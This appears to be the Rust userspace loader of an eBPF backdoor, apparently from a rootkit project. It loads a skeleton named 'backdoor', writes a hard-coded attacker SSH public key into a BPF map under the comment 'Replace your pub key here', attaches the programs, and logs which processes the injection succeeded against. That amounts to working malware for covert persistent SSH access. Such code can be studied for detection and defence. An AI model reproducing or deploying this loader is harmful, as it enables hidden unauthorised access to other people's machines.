use std::time::Duration;

use plain::Plain;
use libbpf_rs::{
    RingBufferBuilder,
    MapFlags,
    Error
};


mod backdoor {
    include!(concat!(env!("OUT_DIR"), "/backdoor.skel.rs"));
}

use backdoor::*;

const MAX_PAYLOAD_LEN:usize = 580;


fn pad_zeroes<const A: usize, const B: usize>(arr: [u8; A]) -> [u8; B] {
    assert!(B >= A); //just for a nicer error message, adding #[track_caller] to the function may also be desirable
    let mut b = [0; B];
    b[..A].copy_from_slice(&arr);
    b
}


#[repr(C)]
#[derive(Debug, Clone)]
pub struct CustomPayload {
    pub raw_buf: [u8; MAX_PAYLOAD_LEN],
    pub payload_len: u32,
}

impl CustomPayload {
    pub fn new<const A:usize>(buf:&[u8;A])->Self{
        CustomPayload {
            raw_buf: pad_zeroes(*buf),
            payload_len: buf.len() as u32,
        }
    }
}

unsafe impl Plain for CustomPayload{

}
unsafe impl Plain for backdoor::backdoor_bss_types::event{

}


fn rb_handler(data:&[u8]) ->i32 {
    let mut event = backdoor_bss_types::event::default();
    plain::copy_from_bytes(&mut event, data).expect("Data buffer was too short");

    let comm = std::str::from_utf8(&event.comm).unwrap();

    println!(
        "{:16} {:<7} {:}",
        comm.trim_end_matches(char::from(0)),
        event.pid,
        event.success,
    );

    0
}

fn main() -> Result<(),Error>  {

    let skel_builder = BackdoorSkelBuilder::default();


    let open_skel = skel_builder.open()?;

    // Begin tracing
    let mut skel = open_skel.load()?;

    //Replace your pub key here
    let val = CustomPayload::new(b"\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC31FcYRWU1GQi6r0jLHwm7Ko9j8WaWFC9Y4RbRjbrRbx22HS/ZWhUr2mKtYR//QxhsP4uMzWOJka+yxxBhTo6GPJboMWrkPMr0R23+cXG2SIub/BeZqNe7qDOadp9Ng/ovzEWtpCQhtkrDSv+98RuHfNCngdpIjPDzf11k+GNNKwGtltO5YmUay/tqVrm8AsnmKhB7Xe0kuNPzHQVTWFB46k6xeWs/0NqHETmYxFznCYxGXYPX7+QMdGPZVvG2MLAxAUN/i6x7oygD6AGYTk9iQyAG/1TTgzSMWVXGC+8ZoSMQCxwNKpVl2Tqf79CmKjo6aTsJOihCtmSMoRRvr9vz9p/KYrSH5pSYbblKQHlYQRqFlaPRsqK13/oRE2cgVu0cU+hMSfMW+COYez0k82S0fck9BdEhU6PLyFby3fs7QHedeKvR6bKGh7kAsTnIbvJNx0VHQ/0X2Tcf0exW8oYFGMq41/aIWfCvjAyHtf66NqbrtIxD11AJjgmf8pgcR80= eki@DUBHE-VM\n");

    let key = (0 as u8).to_ne_bytes();

    //let val = custom_key;
    unsafe {
        if let Err(e) = skel.maps_mut().map_payload_buffer().update(&key, plain::as_bytes(&val), MapFlags::ANY){
            panic!("{}",e)
        }
    }


    skel.attach()?;


    let mut builder = RingBufferBuilder::new();
    builder.add(skel.maps_mut().rb(), rb_handler).expect("Failed to add ringbuf");
    let ringbuf = builder.build().expect("Failed to build");

    loop {
        ringbuf.poll(Duration::from_millis(100))?;
    }

}

